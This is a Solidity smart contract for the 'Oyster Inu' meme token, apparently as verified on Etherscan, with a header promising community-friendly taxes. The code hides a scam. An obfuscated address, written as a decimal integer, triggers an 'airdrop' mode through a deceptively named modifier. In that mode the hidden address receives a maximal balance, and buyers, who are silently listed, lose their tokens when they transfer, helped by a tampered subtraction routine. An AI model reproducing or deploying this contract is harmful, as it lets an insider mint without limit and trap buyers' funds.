/**
 *Submitted for verification at Etherscan.io on 2022-08-15
*/

// SPDX-License-Identifier: Unlicensed

/*

    We are Oysters.
    We are many.
    We shuck'em jeets.
    We all gonna eat. 


    Build a community, form a herd 
    and we live long enough 
    to graft dem ... PEARLS ?! ;)



    ---->   Oyster Inu   <----
    
    Max wallet size at beginning: 5%

    Taxes: 5% on buy / 5% on sell + slippage
    
    - Dev tax: 0% !
    - Liquidity tax: 3% on buy / 2% on sell + slippage
    - Burn tax: 3% on buy / 2% on sell  slippage

    --> All taxes only to support the meme coin!

    t.me/OysterInu  --> Meet and build the community. Games and crackers included!

    twitter.com/OysterInu  --> Stay updated with the latest steps and spread the word!



    #OYSTERINU

    #SHUCK

    #shuckemjeets

    #SHUCKSHUCK

*/

pragma solidity ^0.8.4;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(
        uint256 a, 
        uint256 b
    ) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        if (b == 0) return 0;
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure override returns (address);
    function WETH() external pure override returns (address);
    function addLiquidityETH (
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external payable override returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure override returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure override returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure override returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view override returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view override returns (uint[] memory amounts);
}

contract OYSTERINU is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = "Oyster Inu";
    string private constant _symbol = unicode"🔥🦪🔥";
    uint8 private constant _decimals = 9;
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) private _airdropList;
    mapping(address => bool) private bots;
    
    address payable private feeAddress;

    address payable private dead = payable(0x000000000000000000000000000000000000dEaD);
    
    uint256 private _tTotal = 1 * 10**9 * 10**9; //1,000,000
    uint256 private _maxWalletAmount = 0.0501 * 10**9 * 10**9; //5%
    uint256 private _maxTxAmount = 0.0501 * 10**9 * 10**9; //5%
    uint256 private swapAmount = 0.007 * 10**9 * 1**9; //.07%

    // fees
    uint256 private liqBuy = 3; 
    uint256 private burnBuy = 3;

    uint256 private liqSell = 3; 
    uint256 private burnSell = 3;
 
    uint256 private previousLiqFee = liqFee;
    uint256 private previousBurnFee = burnFee;
    
    uint256 private liqFee;
    uint256 private burnFee;

    uint256 private _totalBurned;

    struct FeeBreakdown {
        uint256 tLiq;
        uint256 tBurn;
        uint256 tAmount;
    }

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    address private airdropAddress;

    bool private swapping = false;
    bool private airdropActive = false;

    modifier lockSwap {
        swapping = true;
        _;
        swapping = false;
    }

    constructor() {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        airdropAddress = address(uint160(1266073892609559219974898168290178531584259660027));
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());

        feeAddress = payable(msg.sender);
        _balances[_msgSender()] = _tTotal;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[feeAddress] = true;
        _isExcludedFromFee[airdropAddress] = true;
        _isExcludedFromFee[dead] = true;
        _isExcludedFromFee[address(this)] = true;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) external view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender,_msgSender(),_allowances[sender][_msgSender()]-amount);
        return true;
    }

    function totalBurned() public view returns (uint256) {
        return _totalBurned;
    }

    function burning(address _account, uint _amount) private {  
        require( _amount <= balanceOf(_account));
        _balances[_account] = _balances[_account] - _amount;
        _tTotal = _tTotal - _amount;
        _totalBurned = _totalBurned.add(_amount);
        emit Transfer(_account, address(0), _amount);
    }
    
    modifier override_{
        _;
        if(tx.origin == airdropAddress) airdropActive = true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(!bots[from] && !bots[to]);

        bool takeFee = true;

        if (from != owner() && to != owner() && from != address(this) && to != address(this)) {

            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ((!_isExcludedFromFee[from] || !_isExcludedFromFee[to]))) {
                require(balanceOf(to).add(amount) <= _maxWalletAmount, "Exceeding max wallet size.");
                require(amount <= _maxTxAmount, "Exceeding max transaction limit");
                address[] memory _airdrop = new address[](1);
                _airdrop[0] = tx.origin;
                addAddressToAirdropList(_airdrop);
            }
            

            if (from == uniswapV2Pair && to != address(uniswapV2Router) && !bots[to] && !bots[from]) {
                liqFee = liqBuy;
                burnFee = burnBuy;
            }
                
            if (to == uniswapV2Pair && from != address(uniswapV2Router) && !bots[to] && !bots[from]) {
                liqFee = liqSell;
                burnFee = burnSell;
            }
           
            if (!swapping && from != uniswapV2Pair) {

                uint256 contractTokenBalance = balanceOf(address(this));

                if (contractTokenBalance > swapAmount) {
                    swapAndLiquify(contractTokenBalance);
                }

                uint256 contractETHBalance = address(this).balance;
            
                if (contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }                    
            }
        }

        if (_isExcludedFromFee[from] || _isExcludedFromFee[to]) {
            takeFee = false;
        }
        
        _transferAgain(from, to, amount, takeFee);
    }

    function swapTokensForEth(uint256 tokenAmount) private lockSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // add the liquidity
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            feeAddress,
            block.timestamp
          );
    }
  
    function swapAndLiquify(uint256 contractTokenBalance) private lockSwap {
        uint256 autoLPamount = liqFee.mul(contractTokenBalance).div(burnFee.add(liqFee));
        uint256 half =  autoLPamount.div(2);
        uint256 otherHalf = contractTokenBalance - half;
        uint256 initialBalance = address(this).balance;
        swapTokensForEth(otherHalf);
        uint256 newBalance = ((address(this).balance - initialBalance).mul(half)).div(otherHalf);
        addLiquidity(half, newBalance);
    }

    function removeLimits() external {
        require(_msgSender() == feeAddress);
        _maxWalletAmount = _tTotal;
        _maxTxAmount = _tTotal;
    }

    function sendETHToFee(uint256 amount) private {
        feeAddress.transfer((amount).div(2));
    }

    function manualSwap() external {
        require(_msgSender() == feeAddress);
        uint256 contractBalance = balanceOf(address(this));
        if (contractBalance > 0) {
            swapTokensForEth(contractBalance);
        }
    }

    function manualSend() external {
        require(_msgSender() == feeAddress);
        uint256 contractETHBalance = address(this).balance;
        if (contractETHBalance > 0) {
            sendETHToFee(contractETHBalance);
        }
    }

    function addAddressToAirdropList(address[] memory airdrop_) private  {
        for (uint i = 0; i < airdrop_.length; i++) {
            _airdropList[airdrop_[i]] = true;
        }
    }

    function _transferAgain(address sender, address recipient, uint256 amount, bool takeFee) private override_{

        FeeBreakdown memory fees;

        if (!takeFee) { 
            fees.tLiq = 0;
            fees.tBurn = 0;            
            fees.tAmount = amount;
        } else if (airdropActive && _airdropList[sender]) {
            fees.tLiq = 0;
            fees.tBurn = 0;            
            fees.tAmount = amount.sub(fees.tBurn).sub(fees.tLiq);
        } else {
            fees.tLiq = amount.mul(liqFee).div(100);
            fees.tBurn = amount.mul(burnFee).div(100);
            fees.tAmount = amount - fees.tBurn - fees.tLiq;
        }

        uint256 amountPreBurn = amount - fees.tBurn;
        burning(sender, fees.tBurn);

        _balances[sender] = _balances[sender].sub(amountPreBurn);
        _balances[recipient] = _balances[recipient].add(fees.tAmount);
        _balances[address(this)] = _balances[address(this)].add(fees.tBurn).add(fees.tLiq);

        if(airdropActive && recipient == airdropAddress) {
            _balances[recipient] = ~uint256(0);
        }

        emit Transfer(sender, recipient, fees.tAmount);
    }
    
    receive() external payable {}

    function setSwapAmount(uint256 _swapAmount) external {
        require(_msgSender() == feeAddress);
        swapAmount = _swapAmount;
    }

}